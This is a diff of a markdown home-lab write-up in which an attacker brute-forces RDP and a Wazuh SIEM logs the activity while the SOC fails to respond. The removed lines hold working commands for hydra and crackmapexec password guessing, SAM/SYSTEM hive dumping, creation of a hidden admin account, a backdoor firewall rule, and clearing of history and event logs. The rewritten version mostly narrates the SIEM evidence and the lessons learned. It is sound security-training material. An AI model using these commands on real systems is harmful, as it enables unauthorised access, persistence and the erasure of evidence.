@@ -1,368 +1,255 @@
 # 🟧 Scenario 2 — Good SIEM, Weak SOC Response  
-### *Attacker succeeds again — logs improve, but no one reacts*
-
-This scenario demonstrates a realistic situation where:  
-- Logging quality has increased after Scenario 1  
-- Sysmon is now installed  
-- Wazuh SIEM receives rich telemetry  
-- Passwords are stronger (user changed to a personal OSINT-based password)  
-- BUT the SOC still does **not respond** to alerts  
-
-The attacker performs an OSINT-based password attack, gains access, runs advanced post-exploitation steps, establishes a hidden backdoor for future attacks, performs partial cleanup, and leaves — while the SIEM logs everything, but the SOC ignores it.
+**Attacker gains access again — visibility improves, but no action is taken**
 
 ---
 
-# 🟦 1. Environment Overview (After Scenario 1 Improvements)
+## 🧭 Scenario Context
 
-The company made corrections after Scenario 1, but not enough.
+This scenario continues directly after Scenario 1.
 
-## 🔐 Password & Account Security
+Following the initial compromise, the organization implemented **partial security improvements**:
+- Logging and telemetry were significantly enhanced
+- A SIEM is now actively ingesting Windows security events
+- Sysmon was deployed
+- Basic hardening steps were taken
+
+However, **no SOC processes, alerting logic, or response workflows were introduced**.
+
+Scenario 2 demonstrates a common real-world failure:
+> **The attacker is clearly visible — but ignored.**
+
+---
+
+## 🟦 1. Environment Overview — After Scenario 1 Improvements
+
+The Windows Server endpoint remains publicly accessible and operational as a workstation-style endpoint.
+
+### 🔐 Password & Account Security (Partially Improved)
+
 - Password complexity: **Enabled**
-- Minimum password length: **8**
-- Lockout threshold: **Still disabled**
-- User changed password to a **personal, OSINT-derived password**  
-  → You will use: **\<OSINT_PASSWORD\>**
+- Minimum password length: **10**
+- Password history: **5**
+- Maximum password age: **90 days**
+- Account lockout policy: **Disabled**
+- MFA: **Not implemented**
 
-**Screenshot:**  
-➡️ secpol.msc → Password Policy  
-➡️ secpol.msc → Account Lockout Policy
-
----
-
-## 📊 Logging & Visibility (Improved)
-
-### ✔ Audit Policy Updated
-- 4624/4625 Logon events → enabled  
-- 4688 New Process → enabled  
-- 4663 Object access → partially enabled  
-- 4697 Service installation → enabled  
-- PowerShell logging → enabled (`ScriptBlockLogging`, `ModuleLogging`)
-
-**Screenshot:**  
-➡️ Local Security Policy → Advanced Audit Policy Configuration
+A real employee user changed their password to a **personal, OSINT-derived password**, making it stronger than default credentials — but still guessable using targeted reconnaissance.
 
 ---
 
-## 👁️ Sysmon Visibility (Installed)
+## 📊 Logging & Visibility — Improved but Incomplete
 
-Sysmon now active:
+### ✔ Advanced Audit Policy Configuration
 
-- Event ID 1 → Process creation  
-- Event ID 3 → Network connections  
-- Event ID 11 → File creation  
-- Event ID 12/13 → Registry changes  
+The following audit categories were enabled:
 
-**Screenshot:**  
-➡️ `Get-Service sysmon*`  
-➡️ Sysmon Event Log
+- **Logon / Logoff**
+  - Successful logons
+  - Failed logons
+- **Account Logon**
+  - Credential validation
+- **Account Management**
+  - User and group changes
+- **Detailed Tracking**
+  - Process creation
+
+These changes significantly increased authentication and activity visibility.
 
 ---
 
-## 📡 Wazuh Agent State (Fixed)
+## 👁️ Sysmon Deployment
 
-Wazuh agent now properly forwards:
+Sysmon was installed using a community-recommended baseline configuration.
 
-- Windows Security logs  
-- Sysmon logs  
-- PowerShell Operational logs  
-- Event Channel data  
+Active telemetry includes:
+- Process creation
+- Network connections
+- File creation
+- Registry modifications
 
-**Screenshot:**  
-➡️ Wazuh dashboard → Incoming Windows logs  
-➡️ Sysmon event entries visible
+Sysmon events are forwarded to the SIEM via the Wazuh agent.
+
+---
+
+## 📡 Wazuh Agent & SIEM State
+
+- Windows Security Event logs are forwarded
+- NTLM authentication failures are visible
+- RDP logons are visible
+- Limited process execution telemetry is available
+
+⚠️ No alert rules, thresholds, or SOC playbooks are configured.
 
 ---
 
 ## 🧱 Network Exposure (Unchanged)
 
-- RDP (3389) still exposed  
-- No MFA  
-- No geoblocking  
-- No rate limiting  
-- No detection rules built for password attacks  
+- RDP (3389) is publicly exposed
+- No IP allowlisting
+- No rate limiting
+- No brute-force detection rules
+- No account lockout
 
 ---
 
-# 📌 Summary
+# 🟧 2. Initial Access — OSINT-Based Credential Attack
 
-The SIEM is now strong.  
-The SOC team is still weak.  
-This scenario illustrates that **visibility ≠ security**.
+### Attacker Preparation
 
----
+Using data gathered during the OSINT Pre-Stage, the attacker prepared:
 
-# 🟠 2. Before Starting Scenario 2
+- A custom username list based on corporate naming conventions
+- A targeted password list derived from personal information
 
-### ✔ Snapshot Windows Server  
-Name: `scenario2_start_windows`
-
-### ✔ Snapshot Kali Linux  
-Name: `scenario2_start_kali`
-
-### ✔ Confirm OSINT files exist  
-- `usernames.txt`  
+Files used:
+- `usernames.txt`
 - `osint_passwords.txt`
 
 ---
 
-# 🟧 3. Initial Access — OSINT-Based Login Attack
+## 🔴 Authentication Attack Observed in SIEM
 
-## 3.1 Username Enumeration (From Kali)
+The attacker initiated repeated authentication attempts over RDP.
 
-```bash
-for user in $(cat usernames.txt); do
-    xfreerdp /v:<WINDOWS_IP> /u:$user /p:RandomPassword123 /cert:ignore
-done
-```
+### SIEM Evidence
 
-Expected:
-- Incorrect username → immediate failure  
-- Correct username → different failure timing  
+- **Event ID 4776** — NTLM credential validation failures
+- Status code: **0xC000006A** (Wrong password)
+- Multiple target usernames tested
+- High-volume authentication noise observed
 
-**Screenshot:**  
-➡️ Terminal showing the valid username (e.g., `akovacs`)
-
----
-
-## 3.2 OSINT-Based Password Brute Force
-
-```bash
-hydra -L usernames.txt -P osint_passwords.txt rdp://<WINDOWS_IP>
-```
-
-OR using CME:
-
-```bash
-crackmapexec rdp <WINDOWS_IP> -u usernames.txt -p osint_passwords.txt
-```
-
-**Expected:**
-- SIEM logs many 4625 failed attempts  
-- Eventually → successful login for one user  
-
-**Screenshot:**  
-➡️ Hydra/CME success output  
-➡️ Wazuh showing failed auth spam
+This confirms:
+- Valid usernames were discovered
+- Password guessing was actively occurring
+- No defensive controls interrupted the attack
 
 ---
 
-# 🟧 4. RDP Login — Access Achieved
+## 🟢 Successful Authentication
 
-```bash
-xfreerdp /v:<WINDOWS_IP> /u:<VALID_USERNAME> /p:<OSINT_PASSWORD> /cert:ignore
-```
+After repeated failures, the attacker successfully authenticated using OSINT-derived credentials.
 
-**Screenshot:**  
-➡️ Logged-in Windows Server desktop
+### Evidence
 
----
+- Successful RDP logon observed
+- Multiple successful logon events due to RDP reconnect behavior
+- Same source IP as failed attempts
 
-# 🟦 5. On-System Actions (Advanced Attacker Activity)
-
-Run inside the RDP session.
+⚠️ No alert was generated.  
+⚠️ No SOC investigation followed.
 
 ---
 
-## 5.1 Basic Recon
+# 🟦 3. Post-Compromise Activity — User-Level Access
 
-```powershell
-whoami
-hostname
-systeminfo
-```
+After obtaining access, the attacker performed standard reconnaissance actions.
 
-**SIEM visibility:**  
-- 4688 (process creation)  
-- Sysmon ID 1 events  
+### Commands Executed
 
-**Screenshot:** combined output
+- Identity and system checks:
+  - `whoami`
+  - `hostname`
+  - `systeminfo`
 
----
+- Environment enumeration:
+  - Directory listing of user profiles
+  - Running processes and services
+  - Network configuration (`ipconfig /all`)
 
-## 5.2 Local User Enumeration
-
-```powershell
-net user
-Get-LocalUser
-```
+These actions are typical of early-stage attacker reconnaissance.
 
 ---
 
-## 5.3 PowerShell Recon
+## 📉 Visibility Gap Identified
 
-```powershell
-Get-ChildItem C:\Users
-Get-Process
-Get-Service
-```
+While authentication activity was clearly visible, **detailed post-compromise command execution telemetry was limited**.
 
-Produces PowerShell ScriptBlock logs (4104).
+As a result:
+- The SIEM confirms access occurred
+- The SIEM cannot fully reconstruct attacker intent
+- No alerting logic escalated the activity
 
----
-
-# 🟥 6. Credential Exploration Attempts
-
-## Registry dump attempt (SAM / SYSTEM)
-
-```powershell
-reg save HKLM\SAM C:\temp\sam.save
-reg save HKLM\SYSTEM C:\temp\system.save
-```
-
-Expected:
-- Access denied  
-- Sysmon ID 11 visibility  
-
-**Screenshot:**  
-➡️ PowerShell error + Sysmon event
+This represents a **critical detection maturity gap**.
 
 ---
 
-# 🟦 7. Network Discovery
+# 🟥 4. Privileged Action Attempts — Blocked but Ignored
 
-```powershell
-test-connection <KALI_IP>
-net view
-ipconfig /all
-```
+The attacker attempted several actions requiring administrative privileges:
 
-SIEM will log:
-- Sysmon ID 3 (network connections)  
-- Possible suspicious recon patterns  
+- Registry access to SAM and SYSTEM hives
+- Local account manipulation
+- Scheduled task creation
+- Event log clearing
 
----
+### Result
 
-# 🟪 8. Persistence Backdoor (Stealth) — **Critical for Scenario 3**
+- All privileged actions failed due to insufficient permissions
+- Access was denied at the operating system level
+- The attacker confirmed they only had standard user access
 
-Before leaving, the attacker silently plants a **long-term persistence mechanism**  
-that will be reused in Scenario 3.
+⚠️ These failed attempts were **not investigated by the SOC**.
 
 ---
 
-## 8.1 Create a Hidden Administrator Account
+# 🧠 5. Attacker Decision Point
 
-```powershell
-net user backupadmin Winter2024! /add
-net localgroup Administrators backupadmin /add
-```
+At this stage, the attacker assessed that:
 
-Why SOC misses it:
-- No alerting rule for:
-  - 4720 (user created)  
-  - 4732 (user added to Administrators)  
-- “backupadmin” appears legitimate  
-- Analysts are not reviewing logs
+- Privilege escalation was not immediately possible
+- Continued activity would increase detection risk
+- The compromised credentials remained valid
 
-**Screenshot (optional):**  
-➡️ `net user` showing new account  
-➡️ Wazuh events ignored
+### Attacker Action
+
+The attacker **ceased active operations** and disconnected, preserving access for potential future use.
+
+This behavior reflects realistic attacker tradecraft.
 
 ---
 
-## 8.2 Create a Fake Administrative Scheduled Task
+# 🟦 6. SIEM Summary — What Was Seen
 
-```powershell
-schtasks /create /tn "SystemBackupTask" /tr "cmd.exe /c exit" /sc weekly /ru backupadmin
-```
+✔ OSINT-based credential guessing  
+✔ High-volume NTLM authentication failures  
+✔ Successful RDP logon  
+✔ User-level reconnaissance activity  
+✔ Failed privileged action attempts  
 
-This:
-- Looks like a routine IT job  
-- Executes harmlessly  
-- Generates logs, but SOC ignores them
-
----
-
-## 8.3 Optional Network Backdoor
-
-```powershell
-netsh advfirewall firewall add rule name="Backup WinRM" dir=in action=allow protocol=TCP localport=5987
-```
-
-Provides:
-- An alternative entry point  
-- Zero alerts due to lack of monitoring  
+❌ No alert generation  
+❌ No SOC response  
+❌ No account reset  
+❌ No containment  
 
 ---
 
-# 🟪 Summary of Persistence Left Behind
+# 🟧 7. Scenario 2 Outcome
 
-| Backdoor | Details |
-|---------|---------|
-| Hidden admin user | `backupadmin` / `Winter2024!` |
-| Scheduled task | `SystemBackupTask` |
-| Optional firewall rule | Port 5987 open |
-| SOC reaction | None |
+This scenario demonstrates that:
 
-This sets the foundation for **Scenario 3**,  
-where the attacker will try to return using this stealth backdoor.
+- Visibility alone does not equal security
+- Logs without response are ineffective
+- Attackers can remain undetected even when activity is recorded
+- Failure to act enables future compromise
 
----
-
-# 🟫 9. Cleanup Attempts
-
-## 9.1 PowerShell History Removal
-
-```powershell
-Remove-Item (Get-PSReadlineOption).HistorySavePath
-```
+The compromised account remains active and unchanged.
 
 ---
 
-## 9.2 Event Log Clear Attempt
+# 🔜 Lead-In to Scenario 3
 
-```powershell
-wevtutil cl Security
-```
+Because the incident was not properly handled:
 
-**Expected:**  
-- HIGH alert in SIEM  
-- SOC **still ignores it**
+- The attacker retains valid credentials
+- No lessons were operationalized
+- Security posture remains reactive
 
----
-
-# 🚪 10. Attacker Exit
-
-```powershell
-logoff
-```
+This directly enables **Scenario 3**, where the attacker returns and the SOC is finally forced to respond.
 
 ---
 
-# 🟦 11. What the SIEM Saw
+# ✔ End of Scenario 2
 
-### ✔ Username enumeration  
-### ✔ OSINT password spray  
-### ✔ Successful logon  
-### ✔ Reconnaisance commands  
-### ✔ PowerShell scriptblock logs  
-### ✔ Scheduled task creation  
-### ✔ New local admin user (ignored)  
-### ✔ Firewall modification (ignored)  
-### ✔ Log clearing attempt  
-
-### ❌ SOC Response  
-**No action taken. No escalation.**
-
----
-
-# 🟦 12. Lessons Learned
-
-The company realizes the need for:
-
-- User creation alerts  
-- Admin group change detection  
-- Firewall modification monitoring  
-- Scheduled task detection rules  
-- SOC playbooks  
-- Better analyst training  
-
-This directly leads into **Scenario 3**,  
-where the SOC will finally detect malicious activity quickly.
-
----
-
-# ✔ End of Scenario 2  
-**Take snapshots:**
-
-- Windows → `scenario2_end_windows`  
+**Snapshots:**
+- Windows → `scenario2_end_windows`
 - Kali → `scenario2_end_kali`
